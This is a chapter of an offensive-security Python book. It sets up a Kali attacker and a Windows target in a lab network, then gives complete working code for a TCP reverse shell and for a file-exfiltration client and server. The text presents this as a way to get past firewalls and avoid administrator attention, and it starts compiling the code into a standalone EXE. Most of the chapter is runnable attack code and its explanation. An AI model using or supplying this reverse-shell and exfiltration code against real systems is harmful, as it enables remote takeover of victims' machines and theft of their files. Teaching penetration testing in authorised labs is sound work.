<html><head></head><body>
        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Warming up – Your First Antivirus-Free Persistence Shell</h1>
                
            
            <article>
                
<p class="calibre2">Nowadays, security solutions such as firewalls, IPS, and sandboxing are becoming more and more advanced to prevent and detect cyber-attacks. So, being an advanced hacker requires you to code your own script and tools to bypass these security solutions.</p>
<p class="calibre2">The following topics will be covered in this chapter:</p>
<ul class="calibre9">
<li class="calibre10">Preparing the attacker machine</li>
<li class="calibre10">Preparing the target machine</li>
<li class="calibre10">TCP reverse Shell</li>
<li class="calibre10">HTTP reverse Shell</li>
<li class="calibre10">Persistence</li>
<li class="calibre10">Tuning connection attempts</li>
<li class="calibre10">Tips for preventing a shell breakdown</li>
<li class="calibre10">Countermeasures</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Preparing the attacker machine</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will prepare our Kali Linux machine as the attacker. Note that we are assuming that the operating system is already set up in VMware or <span class="calibre11">VirtualBox</span>. As of now, we will be using VirtualBox for all our chapters. </p>
<p class="calibre2">We can check the version of any Linux OS by running the following <kbd class="calibre12">cat</kbd> command to display the content from the file <kbd class="calibre12">/etc/os-release</kbd>, which contains OS distribution data. We will be using Kali Linux version 2018.1, as you can see from the following screenshot:</p>
<div class="packt_figure1"><img src="../images/00005.jpeg" class="calibre17"/></div>
<p class="calibre2">It doesn't matter what your Kali version is. For this book, we will be using the latest version available at the time of writing. Since, by default, Python is preinstalled in every Linux distribution, we can get the version details from either the interactive shell by running the command <kbd class="calibre12">python</kbd> or by using <kbd class="calibre12">python -V</kbd>, as shown in the following screenshot: </p>
<div class="packt_figure1"><img src="../images/00006.jpeg" class="calibre18"/></div>
<p class="calibre2">We will be using <kbd class="calibre12">Python 2.7.14+</kbd> for now, which came preinstalled with our Linux version.</p>
<p class="calibre2">So, let's go for networking a little bit. In this chapter, the Kali IP is <kbd class="calibre12">10.0.2.15</kbd>. We can check the Kali IP by running the <kbd class="calibre12">ifconfig eth0</kbd><strong class="calibre4"> </strong>command. This will return the network interface configuration as shown here: </p>
<div class="packt_figure1"><img src="../images/00007.jpeg" class="calibre19"/></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Setting up internet access</h1>
                
            
            <article>
                
<p class="calibre2">To set up the internet on our system, we just need to change the network mode to <strong class="calibre4">Network Address Translation</strong> (<span class="calibre11">NAT)</span> in VirtualBox. <span class="calibre11"><span class="calibre11">NAT</span> mode will mask all network activity as if it came from your host OS, although VirtualBox can access external resources.</span> To do this, perform the following steps:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Click on the <span>Devices</span> menu from VirtualBox's menu bar</li>
<li value="2" class="calibre10">Go to <span>Network</span> and select <span>Network Settings</span></li>
<li value="3" class="calibre10">Select the network mode as <span>NAT</span><span> and click on</span> <span>OK</span> as shown in the following screenshot:<span><br class="title-page-name"/></span>
<div class="packt_figure1"><img src="../images/00008.jpeg" class="calibre20"/></div>
</li>
</ol>
<p class="calibre2">Once you perform the preceding steps, you should be able to reach the internet, as long as the VirtualBox host does. You can check internet access by running <kbd class="calibre12">ping 8.8.8.8</kbd> from the terminal.</p>
<p class="calibre2">Now, if you don't have a GUI compiler for Python, you can just install it using the following command:</p>
<pre class="packt_figure"><strong class="calibre1">apt-get install idle</strong></pre>
<p class="calibre2">Once it's installed, let's do a quick print program using <strong class="calibre4"><span class="calibre11">IDLE (using Python-2.7)</span></strong><span class="calibre11">,</span> <span class="calibre11">which we installed using the previous command</span>. Open a new Python file and type <kbd class="calibre12">print ('hello there')</kbd>. Run the program and save it on the desktop. Once you finish accessing the internet, you now need to change the network mode back to <span class="calibre11">Internal Network</span> so that we can reach out to our Windows target. This is shown in the following screenshot:</p>
<div class="packt_figure1"><img src="../images/00009.jpeg" class="calibre21"/></div>
<div class="packt_infobox">Note that the Windows target <span>globally </span>machine is sitting on the same internal network as Kali attacker globally machine, <kbd class="calibre22">intnet</kbd>, here.</div>
<p class="calibre2">And, as a last step, we should verify that we still got the same IP address, which is <kbd class="calibre12">10.0.2.15</kbd> by running <kbd class="calibre12">ifconfig</kbd> in the terminal. </p>
<div class="packt_tip">if the IP changes, you can change the IP back by running <kbd class="calibre22">ifconfig eth0 10.0.2.15.</kbd></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Preparing the target machine</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will be preparing our target. We are using a 32-bit Windows 7 machine as our target. We will begin by installing Python 2.7.14+ version from <a href="https://www.python.org/downloads/" class="calibre8">https://www.python.org/downloads/</a>. After you begin the installation, you'll notice that Python will install other handy tools such as <kbd class="calibre12">pip</kbd> and <kbd class="calibre12">easy_install</kbd>. We will be using <kbd class="calibre12">pip</kbd> to install third-party libraries later on.</p>
<p class="calibre2">Similar to what we have done in Kali, we will create a quick and simple Python script just to make sure that everything is working fine. Create a new file. Type <kbd class="calibre12">print ('hi')</kbd>, run the script, and save it to the desktop. After this, we need to add Python to our path, so we can start an interactive mode or interactive shell anywhere from the command line. Open a command line and type <kbd class="calibre12">python</kbd>; you will see that Windows does not recognize the <kbd class="calibre12">python.exe</kbd> application by default, so we've got to add that manually.</p>
<p class="calibre2">Perform the following steps to achieve this:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Go to <span>Advanced system settings</span> | <span>Environment Variables.</span></li>
<li value="2" class="calibre10">In <span>System Variables</span>, scroll down until you reach the variable <span>Path</span>. You will need to append the Python path and the <kbd class="calibre12">pip</kbd> path here.</li>
<li value="3" class="calibre10">Copy the path where the Python application is installed and append it to the <span>Variable value</span>.</li>
<li value="4" class="calibre10"><span>Ensure that you insert a semicolon at the end, just to make sure that you append it to our existing <span>Variable value</span>.</span></li>
</ol>
<ol start="5" class="calibre13">
<li value="5" class="calibre10">Also, copy the path where <kbd class="calibre12">pip</kbd> is installed from the <kbd class="calibre12">/Scripts</kbd> folder and append it to the <span>Variable value</span> as shown in the following screenshot: 
<div class="packt_figure1"><img src="../images/00010.jpeg" class="calibre23"/></div>
</li>
<li value="6" class="calibre10">Restart the machine so that it recognizes the new values we've just inserted.</li>
</ol>
<ol start="7" class="calibre13">
<li value="7" class="calibre10">After the restart is complete, open a command line and type <kbd class="calibre12">python</kbd> and the interactive shell will appear:
<div class="packt_figure1"><img src="../images/00011.gif" class="calibre24"/></div>
</li>
</ol>
<ol start="8" class="calibre13">
<li value="8" class="calibre10">Now, to get connectivity with our Kali machine, make sure that the network setting is set to <span>Internal Network</span> and the network name matches the name on the Kali side, which is <kbd class="calibre12">intnet</kbd>:<br class="title-page-name"/>
<div class="packt_figure1"><img src="../images/00012.jpeg" class="calibre25"/></div>
</li>
</ol>
<ol start="9" class="calibre13">
<li value="9" class="calibre10">Lastly, we need to give this machine an IP address on the same subnet as the Kali machine. We can change the network settings by going to <span>Network and Internet</span>/<span>Network and Sharing Center</span> from the control panel. Click on the <span>Local Area Connection</span> and then click on <span>Properties</span>. From there, go to <span>Internet Protocol Version 4 (TCP/IPv4)</span>, enter the <span>IP address</span> as <kbd class="calibre12">10.0.2.10</kbd> and the rest as shown in the following screenshot. Then click on <span>OK</span>:</li>
</ol>
<div class="packt_figure1"><img src="../images/00013.jpeg" class="calibre26"/></div>
<div class="packt_infobox">We have installed the Python compiler on the target machine just to have a better way to explain the code and compile it. However, we will compile the Python script into a standalone EXE later on, so it'll work on any target without having a Python compiler installed.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">TCP reverse shell</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will have a quick overview of TCP reverse shells, why we need a reverse connection, and what a shell is. The best way to answer these questions is to study the topology shown in the following figure:</p>
<div class="packt_figure1"><img src="../images/00014.jpeg" class="calibre27"/></div>
<p class="calibre2">Let's say that we have an <strong class="calibre4">Attacker</strong> connected somewhere on the <strong class="calibre4">Internet,</strong> and on the right side we have our <strong class="calibre4">Target</strong>. So technically, we have a PC that is fully patched with a <strong class="calibre4">built-in firewall</strong> <strong class="calibre4">enabled</strong>, and we have the corporate firewall in place. And most likely that <strong class="calibre4">Corporate firewall</strong> is integrated with an <strong class="calibre4">IPS</strong> module or <strong class="calibre4">Antivirus software</strong>. So now, for the attacker to access this protected PC, there are two major problems here. First, the attacker needs to bypass the built-in or the host-based firewall on the operating system, which, by default, will block any incoming connection to that PC unless it's explicitly permitted; and the same rule goes for the corporate firewall as well.</p>
<p class="calibre2">But, if the attacker could somehow find a way to send a malicious file to the user, or maybe trick that user into visiting our malicious website and downloading a malicious file, then we might be able to compromise that PC or maybe the whole network. So, in order to bypass the firewall root restriction, we need to make our target, which is the TCP client, initiate the connection back to us. So, in this case, we are acting as a TCP server, and our target, or our victim here, is acting as a TCP client and this is exactly why we need a reverse shell.</p>
<p class="calibre2">Now, we need to understand what a shell is in the first place. If we can initiate a <kbd class="calibre12">cmd</kbd> process on the target machine and bind that process to a network socket, in this case, it's called a <strong class="calibre4">reverse shell</strong>. Hence, when we say that we sent a TCP reverse shell on port <kbd class="calibre12">123</kbd> to the target machine, it means that once the victim runs the file, we're expecting to receive a reverse TCP connection on port <kbd class="calibre12">123</kbd>. So, the destination port in this case will be <kbd class="calibre12">123</kbd>, and we should be listening on this port. So this port should be open in our Kali machine. Then, after completing the TCP three-way handshake, we can send certain commands to the victim/target, make the victim execute them, and get the result back to us.</p>
<div class="packt_infobox">Keep in mind that a combination of social engineering and client-side attacks, which we discussed here, is the most powerful type of attack, and is highly likely to succeed.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Coding a TCP reverse shell</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will call a sample TCP server on the Kali machine and a sample TCP client on the target machine. Then, we will see how to execute some commands remotely from the Kali machine.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Server side</h1>
                
            
            <article>
                
<p class="calibre2">Lets start with the server side. Building a TCP server in Python is quite simple:</p>
<pre class="packt_figure"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># Basic TCP Server <br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>import socket # For Building TCP Connection<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>def connect():<br class="title-page-name"/>    <br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'<br class="title-page-name"/>    <br class="title-page-name"/>    s.bind(("10.0.2.15", 8080)) # define the kali IP and the listening port<br class="title-page-name"/>    <br class="title-page-name"/>    s.listen(1) # define the backlog size, since we are expecting a single connection from a single<br class="title-page-name"/>                                                            # target we will listen to one connection<br class="title-page-name"/>    <br class="title-page-name"/>    print '[+] Listening for incoming TCP connection on port 8080'<br class="title-page-name"/>    <br class="title-page-name"/>    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source<br class="title-page-name"/>                                # port in a tuple format (IP,port)<br class="title-page-name"/>    <br class="title-page-name"/>    print '[+] We got a connection from: ', addr<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>    while True:<br class="title-page-name"/>        <br class="title-page-name"/>        command = raw_input("Shell&gt; ") # Get user input and store it in command variable<br class="title-page-name"/>        <br class="title-page-name"/>        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop<br class="title-page-name"/>            conn.send('terminate')<br class="title-page-name"/>            conn.close()<br class="title-page-name"/>            break<br class="title-page-name"/><br class="title-page-name"/>        else:<br class="title-page-name"/>            conn.send(command) # Otherwise we will send the command to the target<br class="title-page-name"/>            print conn.recv(1024) # and print the result that we got back<br class="title-page-name"/>        <br class="title-page-name"/>def main ():<br class="title-page-name"/>    connect()<br class="title-page-name"/>main()</pre>
<p class="calibre2">As you can see from the preceding code, the script starts with importing the <kbd class="calibre12">socket</kbd> library, which is responsible for coding a low-level network interface. The <kbd class="calibre12">AF_INIT</kbd> defines the socket address as a pair: the host and port. In this case, it will be <kbd class="calibre12">10.10.10.100</kbd>, and the port is <kbd class="calibre12">8080</kbd>. The <kbd class="calibre12">SOCK_STREAM</kbd> is the default mode for the socket type. Now, the bind function specifies the Kali IP address and the listening port in a tuple format, which is <kbd class="calibre12">10.10.10.100</kbd>, and we should be listening on port <kbd class="calibre12">8080</kbd> to receive a connection.</p>
<p class="calibre2">Since we are expecting only a single connection from a single target, we'll be listening for a single connection. So the backlog size, which specifies the maximum number of queued connection, is <kbd class="calibre12">1</kbd>; and we define the listening value to be <kbd class="calibre12">1</kbd>. Now, the <kbd class="calibre12">accept</kbd> function returns the value of a pair of connection objects (<kbd class="calibre12">conn</kbd>), as well as the address (<kbd class="calibre12">addr</kbd>). The address here is the target IP address and the source port used from the target to initiate the connection back to us. Next, we will go into an infinite loop and get our command input and send it to the target machine. This raw input is used to get the user input. If the user input was <kbd class="calibre12">terminate</kbd>, we will inform our target that we want to close the session, and then we will close the session from our side. Otherwise, we will send a <kbd class="calibre12">command</kbd> to the target, and we will read and print the first KB of the received data from the target side.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Client side</h1>
                
            
            <article>
                
<p class="calibre2">Now, let's look into the client side script:</p>
<pre class="packt_figure"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># Basic TCP Client<br class="title-page-name"/><br class="title-page-name"/>import socket # For Building TCP Connection<br class="title-page-name"/>import subprocess # To start the shell in the system<br class="title-page-name"/><br class="title-page-name"/>def connect():<br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's' <br class="title-page-name"/>    s.connect(('10.0.2.15', 8080)) # Here we define the Attacker IP and the listening port<br class="title-page-name"/> <br class="title-page-name"/>    while True: # keep receiving commands from the Kali machine<br class="title-page-name"/>        command = s.recv(1024) # read the first KB of the tcp socket<br class="title-page-name"/>        <br class="title-page-name"/>        if 'terminate' in command: # if we got terminate order from the attacker, close the socket and break the loop<br class="title-page-name"/>            s.close()<br class="title-page-name"/>            break <br class="title-page-name"/>        <br class="title-page-name"/>        else: # otherwise, we pass the received command to a shell process<br class="title-page-name"/>            <br class="title-page-name"/>            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)<br class="title-page-name"/>            s.send( CMD.stdout.read() ) # send back the result<br class="title-page-name"/>            s.send( CMD.stderr.read() ) # send back the error -if any-, such as syntax error<br class="title-page-name"/><br class="title-page-name"/>def main ():<br class="title-page-name"/>    connect()<br class="title-page-name"/>main()</pre>
<p class="calibre2">We import the <kbd class="calibre12">subprocess</kbd> to start the shell and the system. Next, the connection part is quite simple. We define <kbd class="calibre12">s</kbd> and <kbd class="calibre12">socket</kbd> object, and we specify the IP address of the Kali machine and the port that we should initiate the connection on. The port that we are listening to on the Kali machine should exactly match the port from which we initiate the connection from the target machine. Similar to the server side, we will go into an infinite loop and get the attacker command. If the attacker command is <kbd class="calibre12">terminate</kbd>, or if there is a <kbd class="calibre12">terminate</kbd> keyword or string in the command, then we close the connection and break the infinite loop, otherwise we will use the <kbd class="calibre12">subprocess</kbd> to start a shell in the system. We will pass the command that we have received from the attacker machine to the <kbd class="calibre12">subprocess</kbd>, and get the result or the error. Notice that the <kbd class="calibre12">subprocess</kbd> has a kind of self-mechanism for exception handling. For instance, if we mistype a certain command on the Kali side and send the wrong syntax to the target, instead of crashing the process, the <kbd class="calibre12">stderr</kbd> handles the exception and returns the error.</p>
<p class="calibre2">Let's quickly try our script from the Python IDE that we used earlier for the <kbd class="calibre12">hello there</kbd> program. Run the server side first by clicking on <span class="calibre11">Run</span> and selecting <span class="calibre11">Run Module</span>. Just to verify that we have opened a listener on port <kbd class="calibre12">8080</kbd>, run the following command:</p>
<pre class="packt_figure"><strong class="calibre1"> netstat -antp | grep "8080"</strong></pre>
<div class="packt_figure1"><img src="../images/00015.jpeg" class="calibre28"/></div>
<p class="calibre2">As you can see, <kbd class="calibre12">python2.7</kbd> has opened the port and we are listening. Run the target script on the other VirtualBox. As shown in the following screenshot, we've got ten our shell from an IP address of <kbd class="calibre12">10.0.2.10</kbd>, which is the IP address of our Windows machine, and a source port of <kbd class="calibre12">49160</kbd>:</p>
<div class="packt_figure1"><img src="../images/00016.jpeg" class="calibre29"/></div>
<p class="calibre2">Let's explore the target machine a little bit starting with <kbd class="calibre12">ipconfig</kbd> and <kbd class="calibre12">dir</kbd>:</p>
<div class="packt_figure1"><img src="../images/00017.jpeg" class="calibre30"/></div>
<p class="calibre2">Let's go for <kbd class="calibre12">arp -a</kbd>. We now get the ARP table on the target machine:</p>
<div class="packt_figure1"><img src="../images/00018.jpeg" class="calibre31"/></div>
<p class="calibre2">As shown in the previous screenshot, on mistyping a command, instead of crashing the script, the subprocess <kbd class="calibre12">stderr</kbd> returns the wrong syntax error.</p>
<p class="calibre2">To quickly recap what we have done here so far, we have built a reverse TCP tunnel and got the user input using the raw input. When we type <kbd class="calibre12">arp -a</kbd>, the raw input will get that command and then we will send it to the target machine. Once received at the target side, we initiate <kbd class="calibre12">cmd</kbd> as a subprocess, send the error or the result back, and print it out on the target side.</p>
<div class="packt_infobox">The shell will crash if you hit <em class="calibre32">Enter</em> a couple of times.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Data exfiltration – TCP</h1>
                
            
            <article>
                
<p class="calibre2">In the previous section, we have seen how to navigate target directories. Now we will see how to grab these files. Ensure that, before grabbing any data from the target machine, the rules of engagement explicitly allow this.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Server side</h1>
                
            
            <article>
                
<p class="calibre2">So, let's start with the updated server side script:</p>
<pre class="packt_figure2"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/># TCP Data Exfiltration Server<br class="title-page-name"/><br class="title-page-name"/>import socket <br class="title-page-name"/>import os # Needed for file operation<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># In the transfer function, we first create a trivial file called "test.png" as a file holder just to hold the <br class="title-page-name"/># received bytes , then we go into infinite loop and store the received data into our file holder "test.png", however<br class="title-page-name"/># If the requested file doesn't exist or if we reached the end of the file then we will break the loop<br class="title-page-name"/># note that we could know the end of the file, if we received the "DONE" tag from the target side<br class="title-page-name"/><br class="title-page-name"/># Keep in mind that you can enhance the code and dynamically change the test.png to other file extension based on the user input<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>def transfer(conn,command):<br class="title-page-name"/>    <br class="title-page-name"/>    conn.send(command)<br class="title-page-name"/>    f = open('/root/Desktop/test.png','wb')<br class="title-page-name"/>    while True: <br class="title-page-name"/>        bits = conn.recv(1024)<br class="title-page-name"/>        if 'Unable to find out the file' in bits:<br class="title-page-name"/>            print '[-] Unable to find out the file'<br class="title-page-name"/>            break<br class="title-page-name"/>        if bits.endswith('DONE'):<br class="title-page-name"/>            print '[+] Transfer completed '<br class="title-page-name"/>            f.close()<br class="title-page-name"/>            break<br class="title-page-name"/>        f.write(bits)<br class="title-page-name"/>    <br class="title-page-name"/>    <br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>def connect():<br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br class="title-page-name"/>    s.bind(("10.0.2.15", 8080))<br class="title-page-name"/>    s.listen(1)<br class="title-page-name"/>    print '[+] Listening for incoming TCP connection on port 8080'<br class="title-page-name"/>    conn, addr = s.accept()<br class="title-page-name"/>    print '[+] We got a connection from: ', addr<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>    while True: <br class="title-page-name"/>        command = raw_input("Shell&gt; ")<br class="title-page-name"/>        if 'terminate' in command:<br class="title-page-name"/>            conn.send('terminate')<br class="title-page-name"/>            conn.close() <br class="title-page-name"/>            break<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># if we received grab keyword from the user input, then this is an indicator for<br class="title-page-name"/># file transfer operation, hence we will call transfer function<br class="title-page-name"/>            <br class="title-page-name"/># Remember the Formula is grab*&lt;File Path&gt;<br class="title-page-name"/># Example: grab*C:\Users\Hussam\Desktop\photo.jpeg<br class="title-page-name"/><br class="title-page-name"/>        elif 'grab' in command: <br class="title-page-name"/>            transfer(conn,command)<br class="title-page-name"/><br class="title-page-name"/>        else:<br class="title-page-name"/>            conn.send(command) <br class="title-page-name"/>            print conn.recv(1024) <br class="title-page-name"/>        <br class="title-page-name"/>def main ():<br class="title-page-name"/>    connect()<br class="title-page-name"/>main()</pre>
<p class="calibre2">The <kbd class="calibre12">elif 'grab' in command:</kbd> <span class="calibre11">code </span>indicates that this is not a normal command; this command is used to transfer a file. So, both the server and the client must agree on this indicator or formula. Now, the formula will be <kbd class="calibre12">grab</kbd> followed by <kbd class="calibre12">*</kbd> and the path of the file that we want to grab, for example, <kbd class="calibre12">grab*C:\Users\Hussam\Desktop\photo.jpeg</kbd>.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Client side</h1>
                
            
            <article>
                
<p class="calibre2">Now, let's take a look at the client side script:</p>
<pre class="packt_figure2"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved <br class="title-page-name"/># Follow me on LinkedIn https://jo.linkedin.com/in/python2<br class="title-page-name"/><br class="title-page-name"/># TCP Data Exfiltration Client<br class="title-page-name"/><br class="title-page-name"/>import socket <br class="title-page-name"/>import subprocess <br class="title-page-name"/>import os # needed for file operations<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># In the transfer function, we first check if the file exists in the first place, if not we will notify the attacker<br class="title-page-name"/># otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the<br class="title-page-name"/># server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>def transfer(s,path):<br class="title-page-name"/>    if os.path.exists(path):<br class="title-page-name"/>        f = open(path, 'rb')<br class="title-page-name"/>        packet = f.read(1024)<br class="title-page-name"/>        while packet != '':<br class="title-page-name"/>            s.send(packet) <br class="title-page-name"/>            packet = f.read(1024)<br class="title-page-name"/>        s.send('DONE')<br class="title-page-name"/>        f.close()<br class="title-page-name"/>        <br class="title-page-name"/>    else: # the file doesn't exist<br class="title-page-name"/>        s.send('Unable to find out the file')<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>def connect():<br class="title-page-name"/>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br class="title-page-name"/>    s.connect(('10.0.2.15', 8080))<br class="title-page-name"/> <br class="title-page-name"/>    while True: <br class="title-page-name"/>        command = s.recv(1024)<br class="title-page-name"/>        <br class="title-page-name"/>        if 'terminate' in command:<br class="title-page-name"/>            s.close()<br class="title-page-name"/>            break <br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/># if we received grab keyword from the attacker, then this is an indicator for<br class="title-page-name"/># file transfer operation, hence we will split the received commands into two<br class="title-page-name"/># parts, the second part which we intrested in contains the file path, so we will<br class="title-page-name"/># store it into a variable called path and pass it to transfer function<br class="title-page-name"/>            <br class="title-page-name"/># Remember the Formula is grab*&lt;File Path&gt;<br class="title-page-name"/># Example: grab*C:\Users\Hussam\Desktop\photo.jpeg<br class="title-page-name"/><br class="title-page-name"/>        elif 'grab' in command: <br class="title-page-name"/>            grab,path = command.split('*')<br class="title-page-name"/>            <br class="title-page-name"/>            try: # when it comes to low level file transfer, a lot of things can go wrong, therefore<br class="title-page-name"/>                                          # we use exception handling (try and except) to protect our script from being crashed<br class="title-page-name"/>                                          # in case something went wrong, we will send the error that happened and pass the exception<br class="title-page-name"/>                transfer(s,path)<br class="title-page-name"/>            except Exception,e:<br class="title-page-name"/>                s.send ( str(e) ) # send the exception error<br class="title-page-name"/>                pass<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>        <br class="title-page-name"/>        else:<br class="title-page-name"/>            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)<br class="title-page-name"/>            s.send( CMD.stdout.read() ) <br class="title-page-name"/>            s.send( CMD.stderr.read() ) <br class="title-page-name"/><br class="title-page-name"/>def main ():<br class="title-page-name"/>    connect()<br class="title-page-name"/>main()</pre>
<p class="calibre2">As mentioned previously, both the client and the server must agree on the <kbd class="calibre12">grab</kbd> formula. So, on the client side, if we receive a grab string, we will split the command into two sections, the section before <kbd class="calibre12">*</kbd> and the section after <kbd class="calibre12">*</kbd>, where the second section contains the path and we will store the path in the path variable. Now, to make sure that our script will not crash if something goes wrong during the transfer, we will use the exception handler.</p>
<p class="calibre2">Next, we send the <kbd class="calibre12">path</kbd> variable to the <kbd class="calibre12">transfer</kbd> function. So, the first thing that we'll do in the <kbd class="calibre12">transfer</kbd> function is to check whether the requested file exists in the first place or not. If not, then we'll send the <kbd class="calibre12">'Unable to find out the file'</kbd> message to the server.</p>
<p class="calibre2">Next, we will read the file as pieces or chunks, where each piece or each chunk has a value of 1 KB, and we will loop around until we reach the end of the file. And when we do so, we need to send an indicator or a tag to the server side to indicate that we have reached the end of the file. So, the <kbd class="calibre12">DONE</kbd> string in the preceding code block is to indicate that we have reached the end of the file.</p>
<p class="calibre2">Now, on the server side, we create a placeholder or file holder. We will store the received bytes in <kbd class="calibre12">test.png</kbd>, which is the file holder here. When the control enters the loop, and each time we read 1 KB of data, it's written into <kbd class="calibre12">test.png</kbd>. When it receives the <kbd class="calibre12">DONE</kbd> string, it means that we have reached the end of the file. So, the file is closed and the loop ends. Also, if the server gets <kbd class="calibre12">Unable to find the file</kbd>, it will print this out and break the loop.</p>
<p class="calibre2">Now, run the server script again and we'll be listening to port <kbd class="calibre12">8080</kbd>. Once we run the script on the target side, we get the shell. Next, proceed to the directory and try to grab <kbd class="calibre12">Module2.pdf</kbd> by running the <kbd class="calibre12">grab*Module2.pdf</kbd> command: </p>
<div class="packt_figure1"><img src="../images/00019.jpeg" class="calibre33"/></div>
<p class="calibre2">When we type the aforementioned command, it will trigger the <kbd class="calibre12">if</kbd> statement on both the client side as well as the server side. So, on the target when we receive a <kbd class="calibre12">grab*Module2.pdf</kbd>, we will split up this command into two parts. The second part contains <kbd class="calibre12">Module2.pdf</kbd>, which is the file that we want to grab. We will store it in the path variable as discussed previously. The code will check whether the file exists, read it in chunks, and send it over to the server side. This gives a response at the server side: <kbd class="calibre12">[+] Transfer completed</kbd>.</p>
<p class="calibre2">Find the file on your desktop, it's called <kbd class="calibre12">1.txt</kbd> now, change the file extension to <kbd class="calibre12">.pdf</kbd>, and rename the file, since we know that this is not an image but only a placeholder. Now, open <kbd class="calibre12">Module2.pdf</kbd> using any PDF reader just to make sure that the file is not corrupt. It'll open without any errors if it hasn't been corrupted.</p>
<p class="calibre2">Let's try with another one. Now, we'll grab <kbd class="calibre12">Tulips.png</kbd>:</p>
<div class="packt_figure1"><img src="../images/00020.jpeg" class="calibre34"/></div>
<p class="calibre2">Since the file that we want to grab has the same extension as our file holder, which is <kbd class="calibre12">.png</kbd>, we don't need to change the file extension.</p>
<p class="calibre2">Try to grab any file that exists but the same rule applies here: change the name of the file with its original extension. Let's try with a file that does not exist. Go back to our shell, and type <kbd class="calibre12">grab*blaaaah.exe</kbd> and it will throw an error, as shown in the following image:</p>
<div class="packt_figure1"><img src="../images/00021.jpeg" class="calibre33"/> </div>
<p class="calibre2">This will crash our script on the target side, which you will see when you run <kbd class="calibre12">ipconfig</kbd>.</p>
<p class="calibre2">You <span class="calibre11">were</span> probably expecting us to use a well-known protocol such as FTP, SCP, or secure FTP to do the file transfer. But we used a very low-level file transfer over a TCP socket, so you might ask why we performed it. Since these well-known protocols could be blocked on the firewall, we won't be able to grab any files out. What we have done here is, instead of initiating a new channel every time we want to transfer a file which may trigger the admin's attention, create a single TCP socket, a single session, to gain access, doing a remote shell, as well as for file transfer. This type of transfer is called an <strong class="calibre4">inline transfer</strong>, where we got a single channel and a single session to perform all the desired actions.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Exporting to EXE</h1>
                
            
            <article>
                
<p class="calibre2">There are multiple methods to export your Python script into a standalone EXE file. Today we'll use <kbd class="calibre12">py2exe</kbd> library. You can download the <kbd class="calibre12"><span>py2exe-0.6.9.win32-py2.7.exe</span></kbd> version from <a href="https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/" class="calibre8">https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/</a>.</p>
<p class="calibre2">First, proceed to install this library. It is a fairly simple process just follow the on-screen prompts.</p>
<p class="calibre2">After you've finished the installation, open a Python window on the Windows machine and import <kbd class="calibre12">py2exe</kbd> just to make sure that we can import this library without any exceptions. Type <kbd class="calibre12">python</kbd> and then import <kbd class="calibre12">py2exe</kbd>. If it doesn't throw a error, you're successful:</p>
<div class="packt_figure1"><img src="../images/00022.jpeg" class="calibre33"/></div>
